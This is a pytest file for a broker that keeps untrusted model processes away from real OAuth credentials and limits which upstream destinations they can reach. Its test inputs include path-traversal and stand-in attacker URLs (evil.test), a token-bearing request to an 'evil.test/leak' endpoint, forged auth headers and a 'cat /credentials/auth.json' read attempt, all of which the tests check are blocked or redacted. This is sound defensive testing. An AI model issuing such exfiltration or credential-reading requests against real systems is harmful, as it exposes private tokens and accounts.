"""Untrusted model processes cannot select upstream destinations or access real OAuth."""

import json
import time
from unittest.mock import patch

import httpx
import pytest

from runtime.broker import Broker
from runtime.server import SESSION_BYTES, classify_failure, scrub_session, session_size


def credentials():
    return {"tokens": {"access_token": "synthetic-private-oauth", "refresh_token": "synthetic-private-refresh", "account_id": "private-account"}}


def test_current_claude_structured_auth_rejection_does_not_become_a_generic_failure():
    event = {"type": "result", "is_error": True, "api_error_status": 401, "result": "Failed to authenticate. API Error: 401 Controlled provider rejection"}
    assert classify_failure(json.dumps(event).encode()) == {"kind": "AUTH_ERROR"}
    event["is_error"] = False
    assert classify_failure(json.dumps(event).encode()) == {"kind": "ERROR"}


@pytest.mark.parametrize("path", ["https://evil.test/codex/responses", "//evil.test/codex/responses", "/codex/responses/../secrets", "/codex/responses%2f..", "/auth/start", "/run", "/query/cross-request", "/codex/responses#fragment"])
def test_broker_denies_arbitrary_or_ambiguous_destinations(path):
    broker = Broker("codex", credentials(), 10)
    assert broker.destination("POST", path) is None


def test_broker_only_injects_selected_identity_and_ignores_untrusted_auth():
    broker = Broker("codex", credentials(), 10)
    headers = broker.headers({"Authorization": "Bearer attacker", "Cookie": "private", "ChatGPT-Account-Id": "other-account", "X-Forwarded-Host": "evil.test", "Content-Type": "application/json"})
    assert headers == {"Content-Type": "application/json", "Authorization": "Bearer synthetic-private-oauth", "ChatGPT-Account-Id": "private-account"}
    assert broker.destination("POST", "/codex/responses") == "https://chatgpt.com/backend-api/codex/responses"
    assert broker.destination("PUT", "/codex/responses") is None
    assert broker.destination("POST", "/claude/v1/messages") is None


def test_broker_rejects_authless_network_requests_and_expires_without_provider_call(tmp_path):
    with Broker("codex", credentials(), 5) as broker:
        with httpx.Client(transport=httpx.HTTPTransport(uds=str(broker.path)), base_url="http://provider", timeout=2) as client:
            with patch("runtime.broker.httpx.Client") as upstream:
                assert client.post("/codex/responses", json={}).status_code == 403
                assert client.post("http://evil.test/leak", headers={"Authorization": "Bearer " + broker.token}, json={}).status_code == 403
                broker.deadline = time.monotonic() - 1
                assert client.post("/codex/responses", headers={"Authorization": "Bearer " + broker.token}, json={}).status_code == 403
                upstream.assert_not_called()
        assert broker.events["network_denied"] == 2


def test_broker_logs_categories_without_commands_or_credentials(caplog):
    broker = Broker("codex", credentials(), 10)
    broker.observe_commands(b'{"command":"cat /credentials/auth.json synthetic-private-oauth"}')
    assert broker.events["credential_read_attempt"] == 1
    assert "synthetic-private-oauth" not in caplog.text
    assert "/credentials" not in caplog.text
    assert "credential_read_attempt" in caplog.text
    assert broker.redact({"text": "synthetic-private-oauth synthetic-private-refresh"}) == {"text": "[REDACTED] [REDACTED]"}


def test_historical_cli_copies_are_redacted_without_following_session_symlinks(tmp_path):
    root = tmp_path / "credentials"
    (root / "codex").mkdir(parents=True)
    (root / "codex/auth.json").write_text(json.dumps(credentials()))
    session = tmp_path / "session"
    session.mkdir()
    (session / "history.jsonl").write_text('"synthetic-private-oauth"')
    private = tmp_path / "private"
    private.write_text("synthetic-private-oauth")
    (session / "link").symlink_to(private)
    scrub_session(session, root)
    assert (session / "history.jsonl").read_text() == '\"[REDACTED]\"'
    assert private.read_text() == "synthetic-private-oauth"
    assert session_size(session) <= SESSION_BYTES
